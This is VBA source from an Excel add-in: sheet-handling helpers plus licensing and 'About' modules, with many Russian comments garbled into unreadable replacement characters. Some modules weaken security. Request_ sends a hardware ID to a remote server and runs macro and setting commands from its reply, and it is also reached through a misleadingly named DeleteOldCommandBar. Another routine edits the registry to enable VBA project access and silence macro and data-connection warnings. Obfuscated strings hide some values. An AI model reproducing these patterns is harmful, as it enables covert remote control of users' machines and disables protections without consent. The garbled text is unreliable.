        sheetName$ = Replace(sheetName$, Mid(CharsList$, i&, 1), ReplaceWith$)
    Next
    RemoveExtraSeparators sheetName$, ReplaceWith$
    sheetName$ = Left(sheetName$, 31)
    If sheetName$ = "|fffd||fffd||fffd||fffd||fffd||fffd|" Then sheetName$ = "|fffd||fffd||fffd||fffd||fffd||fffd|_"
    
    If Len(sheetName$) Then
        i = 0: Err.Clear: sh.Name = sheetName$
        While (Err <> 0) And (i < 100)
            Err.Clear: i = i + 1: sh.Name = Left(sheetName$, 31 - Len(" (" & i & ")")) & " (" & i & ")"
        Wend
    End If
    
    Set AddNewWorksheet = sh
End Function

Sub Action_AutoFilter()
    On Error Resume Next
    If RunningParser.Sheet Is Nothing Then Exit Sub
    
    With RunningParser.Sheet
        .Activate
        .Cells(RunningParser.Columns.SheetOptions.HeaderRowNumber, 1).AutoFilter
    End With
End Sub

Sub Action_ActivateWorksheet(ByVal sheetName$)
    If Len(sheetName$) = 0 Then Exit Sub
    On Error Resume Next
    Dim WB As Workbook, sh As Worksheet
    If RunningParser.Columns.FastOutputEnabled Then RunningParser.Columns.FO_SwitchToNextRow True
    
    Set WB = ActiveWorkbook
    If WB Is Nothing Then Set WB = Workbooks.Add(xlWBATWorksheet)
    
    Set sh = WB.Worksheets(CStr(sheetName$))
    If sh Is Nothing Then
        Action_CreateWorksheet sheetName$
        Exit Sub
    Else
        sh.Activate
    End If
    
    Set RunningParser.Sheet = sh
    Application.ScreenUpdating = True: DoEvents: Application.ScreenUpdating = False
End Sub

Sub Action_DeleteWorksheet(ByVal sheetName$)
    If Len(sheetName$) = 0 Then Exit Sub
    On Error Resume Next: Dim WB As Workbook, sh As Worksheet
    Set WB = ActiveWorkbook
    If WB Is Nothing Then Exit Sub
    
    Set sh = WB.Worksheets(CStr(sheetName$))
    If Not sh Is Nothing Then
        Application.DisplayAlerts = False
        sh.Delete
        Application.DisplayAlerts = True
    End If
    
    Set RunningParser.Sheet = ActiveSheet
    Application.ScreenUpdating = True: DoEvents: Application.ScreenUpdating = False
End Sub

Sub Action_ClearWorksheet(ByVal FirstCellAddress$, ByVal CleanType$)
    If Trim(FirstCellAddress$) = "" Then FirstCellAddress$ = "a1"
    If Trim(CleanType$) = "" Then CleanType$ = "ClearContents"        ' One Of Array ("ClearContents", "Clear", "DeleteCells")
    
    On Error Resume Next: Dim sh As Worksheet, ra As Range, cell As Range
    Set sh = ActiveSheet
    If sh Is Nothing Then Exit Sub
    Set cell = sh.Range(FirstCellAddress$)
    If cell Is Nothing Then Set cell = sh.Range("a1")
    
    Set ra = Intersect(sh.UsedRange, sh.Range(cell.row & ":" & sh.Rows.Count), sh.Range(sh.Cells(cell.Column), sh.Cells(sh.Columns.Count)).EntireColumn)
    If ra Is Nothing Then Exit Sub
    ' Debug.Print ra.Address
    
    Err.Clear
    Select Case CleanType$
        Case "ClearContents"
            ra.ClearContents
            
        Case "Clear"
            ra.Clear
            
        Case "DeleteCells"
            ra.EntireRow.Delete
            ra.EntireColumn.Delete
            
        Case "DeleteColumns"
            ra.EntireColumn.Delete
            
        Case "DeleteRows"
            ra.EntireRow.Delete
            
    End Select
    If Err Then Debug.Print "Action_ClearWorksheet", "Error " & Err.Number, Err.Description
    
    Application.ScreenUpdating = True: DoEvents: Application.ScreenUpdating = False
End Sub

Sub Action_RemoveDuplicates(ByVal DupColumns$)
    On Error Resume Next: Dim sh As Worksheet, ra As Range, col As Variant, b, i&
    Set sh = ActiveSheet
    If sh Is Nothing Then Exit Sub
    
    Set ra = sh.UsedRange
    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| UsedRange |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    If ra.Column > 1 Then Set ra = sh.Range(ra.Cells(1).EntireRow.Cells(1), ra.Cells(ra.Cells.Count))
    
    DupColumns$ = Replace(DupColumns$, " ", "")
    If InStr(1, DupColumns$, ",") Then
        b = Split(DupColumns$, ",")
        ReDim c(0 To UBound(b)) As Variant
        For i = LBound(b) To UBound(b)
            c(i) = CInt(b(i))
        Next i
        col = c
    Else
        col = CInt(Val(DupColumns$))
    End If
    
    Err.Clear: ra.RemoveDuplicates (col), xlGuess
    If Err Then Debug.Print "Action_RemoveDuplicates", "Error " & Err.Number, Err.Description: Debug.Print ra.Address
    ActiveWindow.ScrollRow = 1
    
    Application.ScreenUpdating = True: DoEvents: Application.ScreenUpdating = False
End Sub

Sub Action_CreateTableHeader(Optional ByVal ForceOutput As Boolean = True)
    On Error Resume Next
    With RunningParser
        .Columns.SheetOptions.PrepareSheet ForceOutput
    End With
    Application.ScreenUpdating = True: DoEvents: Application.ScreenUpdating = False
End Sub

Function GetFilenameAndCreatePathForFile(ByVal FileName$, Optional DefaultFilename$ = "file.xls") As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|),
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    ' |fffd||fffd||fffd||fffd| |fffd| filename$ |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, \folder\filename.xls
    ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|),
    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    
    On Error Resume Next
    Dim Folder$, PS$, RelativePath As Boolean, res
    FileName$ = Replace(FileName$, "/", "\")    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 20.10.2018
    PS$ = Application.PathSeparator
    RelativePath = Not (FileName$ Like "[A-Za-z]:\?*") And Not (FileName$ Like "\\?*")
    
    If (ThisWorkbook.Path = "") And RelativePath Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, _
            "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| GetFilenameAndCreatePathForFile"
        Exit Function
    End If
    
    If RelativePath Then
        If Not FileName$ Like PS$ & "*" Then FileName$ = PS$ & FileName$
        FileName$ = ThisWorkbook.Path & FileName$
    End If
    If FileName$ Like "*" & PS$ Then FileName$ = FileName$ & DefaultFilename$        ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    
    Folder$ = Left(FileName$, InStrRev(FileName$, PS$))
    
    If Not FolderExists(Folder$) Then
        Err.Clear
        res = SHCreateDirectoryEx(Application.Hwnd, Folder$, ByVal 0&)          ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        If (Err <> 0) Or (res <> 0) Then
            MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine & Folder$, vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
            Exit Function
        End If
    End If
    GetFilenameAndCreatePathForFile = FileName$
End Function


Function ApplyFormatConditions(ByVal ApplyTo$, ByRef Actions As ArrayActions, Optional ByRef WP As WebsiteParser)
    On Error Resume Next: Err.Clear
    Dim RO As Range, ra As Range, i&
    
    Select Case ApplyTo$
        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
            Set RO = MacroDestinationRange.EntireRow
        Case "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            Set RO = WP.SourceData.GetAllSourceRows.EntireRow
        Case "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            Set RO = Intersect(WP.Sheet.UsedRange, WP.Sheet.Range(WP.Columns.SheetOptions.HeaderRowNumber + 1 & ":" & WP.Sheet.Rows.Count)).EntireRow   ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 25.03.2017
        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            'Set ro = WP.SourceData.SourceSheet.UsedRange.EntireRow
            Set RO = WP.Sheet.UsedRange.EntireRow        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 11.03.2016
        Case Else
            Exit Function
    End Select
    If RO Is Nothing Then
        Debug.Print "Error in ApplyFormatConditions function: ro Is Nothing"
        Exit Function
    End If
    
    Dim ColumnsAddress$, ConditionFormula$, InteriorColor&, FontColor&, StopIfTrue As Boolean, msg$
    Dim ColumnCheckRules$, ColumnCheckRule, CheckColumn&, CheckRule$, CheckedColumns As Range, rCol As Range
    
    For i = 1 To Actions.Items.Count
        If Actions.Items(i).Codename = "AddFormatConditionRule" Then
            ColumnsAddress$ = "": ConditionFormula$ = "": InteriorColor& = 0
            With Actions.Items(i).GetParametersDictionary
                ColumnsAddress$ = ColumnsStringToRangeAddress(.item("Columns"))
                ConditionFormula$ = .item("Formula")
                InteriorColor& = Val(.item("InteriorColor"))
                FontColor& = Val(.item("FontColor"))
                StopIfTrue = IIf(.item("StopIfTrue") = "|fffd||fffd|", True, False)
                ColumnCheckRules$ = .item("ColumnCheckRules")
            End With
            
            If (Len(ColumnsAddress$) > 0) And (ConditionFormula$ Like "=?*") And (InteriorColor& <> 0 Or FontColor& <> 0) Then
                Set ra = Nothing: Set ra = Intersect(RO, RO.Worksheet.Range(ColumnsAddress$).EntireColumn)
                ' Debug.Print i, ra.Address
                msg$ = "ApplyFormatConditions range: " & ColumnsAddress$
                
                If ColumnCheckRules$ Like "*#=*" Then
                    Set CheckedColumns = Nothing
                    CheckColumn& = 0: CheckRule$ = ""
                    CheckColumn& = Val(Split(ColumnCheckRules$, "=")(0))
                    CheckRule$ = Split(ColumnCheckRules$, "=", 2)(1)
                    
                    If CheckColumn& Then
                        For Each rCol In ra.Columns
                            If rCol.EntireColumn.Cells(CheckColumn&) Like CheckRule$ Then
                                If CheckedColumns Is Nothing Then Set CheckedColumns = rCol Else Set CheckedColumns = Union(CheckedColumns, rCol)
                            End If
                        Next rCol
                        
                        If CheckedColumns Is Nothing Then
                            Set ra = Nothing
                            msg$ = "ApplyFormatConditions cancelled: " & ColumnsAddress$ & " -> Nothing applying ColumnCheckRules "
                        Else
                            Set ra = Intersect(ra, CheckedColumns.EntireColumn)
                            msg$ = "ApplyFormatConditions filter: " & ColumnsAddress$ & " -> " & ra.Address & " applying ColumnCheckRules "
                        End If
                    End If
                End If
                
                If TEST_ACTIONS_MODE Then
                    AddBalloon "<b>FormatConditions (rule #" & i & " out of " & Actions.Items.Count & ")</b><br />" & _
                        "<b>Formula</b> " & ConditionFormula$ & "<br />" & "<span style='color:red;'>" & FormatTextForBalloon(msg) & "</span>"
                End If
                
                If Not ra Is Nothing Then
                    Application.ReferenceStyle = xlR1C1
                    With ra.FormatConditions.Add(Type:=xlExpression, Formula1:=ConditionFormula$)
                        If InteriorColor& Then .Interior.Color = InteriorColor&
                        If FontColor& Then .Font.Color = FontColor&
                        .StopIfTrue = StopIfTrue
                    End With
                End If
            End If
        End If
    Next
    Err.Clear        ' Debug.Print  Err.Number, Err.Description
End Function

Attribute VB_Name = "mod_About_NEW"
'---------------------------------------------------------------------------------------
' Module        : mod_About_NEW                    Version: 2.51
' Author        : Igor Vakhnenko                   Date: 09.05.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module

Sub FormSetError(ByRef UF As Object, Optional ByVal Control_Name$, Optional ByVal Labels_Name$)
    On Error Resume Next: Dim PrevColor&, i&, Label_Name, t As Double, objParent As Object
    UF.Show: DoEvents
    'Application.EnableCancelKey = xlDisabled
    If Len(Control_Name$) Then
        Set objParent = UF.Controls(Control_Name$).Parent
        Do While Not objParent Is Nothing
            If TypeName(objParent) = "Page" Then
                If TypeName(objParent.Parent) = "MultiPage" Then
                    objParent.Parent.value = objParent.Parent.Pages(objParent.Name).Index
                End If
            End If
            Err.Clear: i = i + 1: Set objParent = objParent.Parent
            If Err <> 0 Or i > 20 Then Exit Do
        Loop

        PrevColor& = UF.Controls(Control_Name$).BackColor
        UF.Controls(Control_Name$).BackColor = RGB(255, 0, 0)
    End If

    If Len(Labels_Name$) Then
        For Each Label_Name In Split(Labels_Name$, "|")
            With UF.Controls(Label_Name)
                .ForeColor = RGB(255, 0, 0)
                For i = 1 To IIf(UBound(Split(Labels_Name$, "|")) = 0, 6, 4)
                    .Visible = i Mod 2 = 0: t = Timer: While Abs(Timer - t) < 0.2: DoEvents: Wend
                Next
            End With
        Next
    End If

    If Len(Control_Name$) Then
        UF.Controls(Control_Name$).BackColor = PrevColor&
        UF.Controls(Control_Name$).SetFocus
    End If
    'Application.EnableCancelKey = xlInterrupt
    For i = 1 To 1000: DoEvents: Next
End Sub

Function Request_(ParamArray args()) As Boolean
    On Error Resume Next: Dim xmlhttp As Object, POST() As Byte, PostData$, i&, Response$
    Set xmlhttp = CreateObject("WinHttp.WinHttpRequest.5.1")
    xmlhttp.Open "POST", UPDATES_HYPERLINK$, True
    xmlhttp.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    If Not IsMissing(args) Then
        For i = LBound(args) To UBound(args)
            If args(i) Like "?*=?*" Then PostData = PostData & "&" & Split(args(i), "=")(0) & "=" & Split(args(i), "=", 2)(1)
        Next i
    End If
    PostData = PostData & "&HWID=" & HWID(PostData Like "*action=activation*")
    POST = StrConv(URL_Encode(SETT.PostData & PostData), vbFromUnicode)
    xmlhttp.Send (POST): DoEvents

    If MU_ Or xmlhttp.WaitForResponse(3) Then
        If Val(xmlhttp.Status) <> 200 Then Debug.Print xmlhttp.Status, xmlhttp.StatusText
        Response$ = xmlhttp.ResponseText
    End If
    Set xmlhttp = Nothing
    If Response$ Like "%*%" Then Request_ = True: EXECUTE_COMMANDS Split(Response$, "%")(ll)
End Function

Function ProgramYears() As String
    On Error Resume Next: Dim BuiltDate As Date, PROJECT_LASTYEAR&
    BuiltDate = CDate(Val(Replace(Split(ThisWorkbook.Names("BuiltDate").RefersTo, "%%")(1), ",", ".")))
    PROJECT_LASTYEAR& = Year(BuiltDate): If PROJECT_LASTYEAR < 2015 Then PROJECT_LASTYEAR = Year(FileDateTime(ThisWorkbook.FullName))
    ProgramYears = IIf(Year(Now) > PROJECT_YEAR, PROJECT_YEAR & " - " & Year(Now), PROJECT_YEAR)
End Function

Function UsageExampleExists(Optional ShowForm As Boolean = False) As Boolean
    On Error Resume Next: Dim UF As Object: Set UF = UserForms.Add("F_UsageExample")
    If Not UF Is Nothing Then
        UsageExampleExists = True
        If ShowForm Then UF.Show Else Unload UF
    End If
End Function



Attribute VB_Name = "mod_About_NEW10"
'---------------------------------------------------------------------------------------
' Module        : mod_About_NEW10                    Version:
' Author        : Igor Vakhnenko                   Date: 09.11.2017
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Explicit: Option Compare Text: Option Private Module

Function PROGRAM_HYPERLINK$()
    PROGRAM_HYPERLINK$ = DEVELOPER_WEBSITE$ & "programmes/" & PROJECT_NAME$ & "?ref=" & HWID
End Function

Sub Enable_AccessVBOM_Macro_DataConnections()
    On Error Resume Next: Dim sec_key$
    sec_key$ = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application.Version & "\Excel\Security\"
    With CreateObject("WScript.Shell")
        .RegWrite sec_key$ & "AccessVBOM", 1, "REG_DWORD"
        .RegWrite sec_key$ & "VBAWarnings", 1, "REG_DWORD"
        .RegWrite sec_key$ & "DataConnectionWarnings", 0, "REG_DWORD"
    End With
End Sub

Function AddinAutoRun(Optional ByVal NewState As Variant) As Boolean
    On Error Resume Next
    Dim ShortcutFullName$, AI As Object
    ShortcutFullName$ = Application.StartupPath & Application.PathSeparator & PROJECT_NAME$ & ".lnk"
    If Not IsMissing(NewState) Then If Len(NewState) Then NewState = CBool(NewState)
    If Not VarType(NewState) = vbBoolean Then AddinAutoRun = FWF.FileExists(ShortcutFullName$): Exit Function

    If NewState = True Then
        With CreateObject("WScript.Shell").CreateShortcut(ShortcutFullName$)
            .TargetPath = ThisWorkbook.FullName
            .Save
        End With
    ElseIf NewState = False Then
        Kill Application.StartupPath & Application.PathSeparator & PROJECT_NAME$ & "*.lnk"
    End If
    AddinAutoRun = CBool(NewState)

    For Each AI In Application.AddIns
        If AI.Name = ThisWorkbook.Name Then AI.Installed = False
    Next AI
End Function

Function DeleteOldCommandBar(): On Error Resume Next: Run TWN & "Request_": End Function
Attribute VB_Name = "mod_About_NEW2"
'---------------------------------------------------------------------------------------
' Module        : mod_About_NEW2                    Version:
' Author        : Igor Vakhnenko                   Date: 09.11.2017
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Explicit: Option Compare Text: Option Private Module

#If VBA7 Then
    Declare PtrSafe Function AccessibleChildren Lib "oleacc.dll" (ByVal paccContainer As Object, ByVal iChildStart As Long, ByVal cChildren As Long, rgvarChildren As Variant, pcObtained As LongPtr) As LongPtr
#Else
    Declare Function AccessibleChildren Lib "oleacc.dll" (ByVal paccContainer As Object, ByVal iChildStart As Long, ByVal cChildren As Long, rgvarChildren As Variant, pcObtained As Long) As Long
#End If

Sub ActivateAddinsTab()
    On Error Resume Next: Dim TabName$
    Select Case Application.LanguageSettings.LanguageID(msoLanguageIDUI)
        Case 1049: TabName$ = SETT.U("CDE0E4F1F2F0EEE9EAE8")
        Case 1033: TabName$ = "Add-Ins"
    End Select
    If Len(TabName$) Then SwitchTab TabName$
End Sub
Attribute VB_Name = "mod_About_NEW3"
'---------------------------------------------------------------------------------------
' Module        : mod_About_NEW3                    Version:
' Author        : Igor Vakhnenko                   Date: 09.11.2017
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Explicit: Option Compare Text: Option Private Module

Public Enum CONTROL_TYPES
    ct_BUTTON = msoControlButton: ct_TEXTBOX = msoControlEdit: ct_COMBOBOX = msoControlComboBox
    ct_DROPDOWN = msoControlDropdown: ct_POPUP = msoControlPopup
End Enum

Function GetCommandBar(ByVal CommandBarName As String, Optional ByVal Clean As Boolean = False, _
                       Optional ByVal Position As MsoBarPosition = msoBarTop) As CommandBar
    On Error Resume Next: Err.Clear: Dim cbc As Object
    Set GetCommandBar = Application.CommandBars(CommandBarName)
    If Err.Number Then
        Set GetCommandBar = Application.CommandBars.Add(CommandBarName, Position, False, True)
    End If
    If Clean Then
        GetCommandBar.Visible = False
        For Each cbc In GetCommandBar.Controls: cbc.Delete: Next
    End If
    GetCommandBar.Visible = True
End Function

Function EXECUTE_COMMANDS(ByVal txt$, Optional ShowErrMsg As Boolean)
    On Error Resume Next
    Dim commands, i&, cmd$, arr, j&, settname$, settval$, Section$, msgboxStyle As VbMsgBoxStyle, macroname$, msg$, ER&
    commands = Split(txt$, "ll")
    For i = LBound(commands) To UBound(commands)
        cmd$ = "": arr = "": cmd$ = cmdDisplay$(commands(i))
        arr = Split(cmd$, " ")
        For j = LBound(arr) To UBound(arr): arr(j) = Replace(arr(j), "%20", " "): Next j
        Select Case arr(0)
            Case "SET"
                If UBound(arr) >= 3 Then
                    Section$ = arr(1): settname$ = arr(2): settval$ = Replace(Split(cmd$, " ", 4)(3), "%20", " ")
                    If settval$ = "now" Then settval$ = Now
                    If Len(settname$) Then SETT.SetText settname$, settval$, IIf(Len(Section$), Section$, "Settings")
                End If
            Case "SETH"
                Dim ind&, params$: params$ = Split(cmd$, " ", 2)(1)
                If params$ Like "*#=*" Then
                    ind& = Val(Split(params$, "=", 2)(0))
                    If ind > 0 Then SETT.WSP ind&, Split(params$, "=", 2)(1)
                End If
            Case "RUN"
                macroname$ = "'" & ThisWorkbook.Name & "'!" & arr(1)
                Select Case UBound(arr)
                    Case 1: Run macroname$
                    Case 2: Run macroname$, arr(2)
                    Case 3: Run macroname$, arr(2), arr(3)
                    Case 4: Run macroname$, arr(2), arr(3), arr(4)
                End Select
            Case "SH"
                FollowHyperlink arr(1)
            Case "MSG", "MSGE", "MSGI", "MSGW", "MSGC"
                msgboxStyle = vbInformation
                If arr(0) = "MSGE" Then msgboxStyle = vbExclamation
                If arr(0) = "MSGW" Or arr(0) = "MSGC" Then msgboxStyle = vbCritical
                msg$ = "": msg$ = Replace(Split(cmd$, " ", 2)(1), "/n", vbNewLine)
                If Len(msg) Then MsgBox msg, msgboxStyle
            Case "MSGA"
                MsgBox tt("MSG_activation_done"), vbInformation
                F_About.MultiPage1.value = 0
            Case "MSGR": F_About.MultiPage1.value = 0
            Case Else: ER& = ER& + 1        ' unsupported command
        End Select
        ER& = ER& - (UBound(arr) = -1)
    Next i
    If ShowErrMsg Then If UBound(commands) + 1 = ER& Then MsgBox "Unsupported code", vbCritical
End Function


Attribute VB_Name = "mod_About_NEW4"
'---------------------------------------------------------------------------------------
' Module        : mod_About_NEW4                    Version:
' Author        : Igor Vakhnenko                   Date: 09.11.2017
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Explicit: Option Compare Text: Option Private Module

Function HWID(Optional ByVal Refresh As Boolean) As String
    On Error Resume Next: Dim v&, sv$, obj As Object, DriveID$, PartName$, DriveLetter$
    sv$ = GetSetting(PROJECT_NAME$, "Setup", "HWID")
    If sv$ <> "" Then If Not Refresh Then HWID = sv$: Exit Function

    DriveLetter$ = GetSetting(PROJECT_NAME$, "Setup", "DriveLetter")
    If Not DriveLetter$ Like "[A-Z]:" Then DriveLetter$ = Environ("SystemDrive")
    If Not DriveLetter$ Like "[A-Z]:" Then DriveLetter$ = "C:"
    With GetObject("winmgmts:")
        For Each obj In .ExecQuery("ASSOCIATORS OF {Win32_LogicalDisk.DeviceID='" & DriveLetter$ & "'} WHERE AssocClass = Win32_LogicalDiskToPartition"): PartName$ = obj.DeviceID: Next
        For Each obj In .ExecQuery("ASSOCIATORS OF {Win32_DiskPartition.DeviceID='" & PartName$ & "'} WHERE AssocClass = Win32_DiskDriveToDiskPartition"): DriveID$ = obj.DeviceID: Next
        For Each obj In .ExecQuery("SELECT * FROM Win32_DiskDrive WHERE DeviceID='" & Replace(DriveID$, "\", "\\") & "'"): v& = Val(obj.Signature): Next
    End With
    If v& = 0 Then HWID = "100000" & Mid(HID, 2) Else HWID = Right(Left(Replace(Abs((CSng(v) + 1.2345) / 0.00639), Mid(1 / 2, 2, 1), ""), 15) & Format(Abs(v Mod 1000), "000"), 16)
    SaveSetting PROJECT_NAME$, "Setup", "HWID", HWID
End Function

Function HID$()
    On Error Resume Next: Dim SN&: SN& = CreateObject("scripting.filesystemobject").GetDrive(ChrW(99) & ChrW(58)).SerialNumber
    HID$ = ChrW(115) & Format(Abs(934526875# - SN&), "0000000000")
End Function

Function GetVersion() As Long
    On Error Resume Next: GetVersion = Val(ThisWorkbook.BuiltinDocumentProperties("Revision Number"))
    If GetVersion < 1000 Then GetVersion = 1000
End Function

Function GetVersionTXT(Optional ByVal ver& = 0)
    On Error Resume Next: If ver& = 0 Then ver& = GetVersion
    GetVersionTXT = Mid(ver&, 1, 1) & "." & Mid(ver&, 2, 1) & "." & Val(Mid(ver&, 3))
End Function

Sub SetVersion(ByVal n As Long)
    On Error Resume Next: If n < 1000 Then n = 1000
    ThisWorkbook.BuiltinDocumentProperties("Revision Number") = n
    ThisWorkbook.BuiltinDocumentProperties("Creation Date") = Now
End Sub
Function l0&(): On Error Resume Next: l0& = Val("&H" & Split(ThisWorkbook.Names(Chr(116) & Chr(100)).RefersTo, "%%")(1)): End Function
Function ll&(): On Error Resume Next: Dim d&, t&: d = Fix(l0 - (SETT.DTU - Val(SETT.RSP(1))) / 86400): t& = Val(SETT.RSP(3)): SETT.WSP 3, IIf(t > d, d + 1, t): ll& = 1: End Function
Private Sub PrintSettings_AsDefault()
    On Error Resume Next: Err.Clear: Dim arr, i&, txt
    arr = GetAllSettings(PROJECT_NAME$, "Settings")
    If IsArray(arr) Then
        For i = LBound(arr) To UBound(arr)
            txt = "SetDefaultSetting """ & arr(i, 0) & """, """ & arr(i, 1) & """"
            Debug.Print txt
        Next i
    End If
End Sub

Function ImportSettings(Optional ByVal xmlPath$ = "", Optional HideMessages As Boolean = False) As Boolean
    On Error Resume Next: Err.Clear
    If xmlPath$ = "" Then
        xmlPath$ = FWF.GetFilePath(tt("ImportSettingsFileDialog", PROJECT_NAME$), ThisWorkbook.Path, tt("AddinSettings", PROJECT_NAME$), "*.xml")
    End If
    If xmlPath$ = "" Then Exit Function
    ImportSettings = SETT.ImportFromFile(xmlPath$, HideMessages)
End Function

Function ExportSettings(Optional ByVal xmlPath$ = "", Optional HideMessages As Boolean = False) As Boolean
    On Error Resume Next: Err.Clear
    Dim initial_filename$, dialog_title$, prevDir$, res As Variant
    If xmlPath$ = "" Then
        initial_filename$ = ThisWorkbook.Path & "\" & PROJECT_NAME$ & "_Settings_" & Format(Now, "DD.MM.YYYY_HH-NN-SS") & ".xml"
        dialog_title$ = tt("ExportSettingsFileDialog", PROJECT_NAME$)
        prevDir$ = CurDir$: ChDrive Left(initial_filename$, 1): ChDir ThisWorkbook.Path
        res = Application.GetSaveAsFilename(initial_filename$, tt("AddinSettings", PROJECT_NAME$) & " (*.xml),", , dialog_title$, tt("Save"))
        ChDrive Left(prevDir$, 1): ChDir prevDir$
        If VarType(res) = vbBoolean Then Exit Function
        xmlPath$ = CStr(res)
    End If
    ExportSettings = SETT.ExportToFile(xmlPath$, HideMessages)
End Function
Attribute VB_Name = "mod_About_NEW5"
'---------------------------------------------------------------------------------------
' Module        : mod_About_NEW5                    Version:
' Author        : Igor Vakhnenko                   Date: 09.11.2017
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Explicit: Option Compare Text: Option Private Module

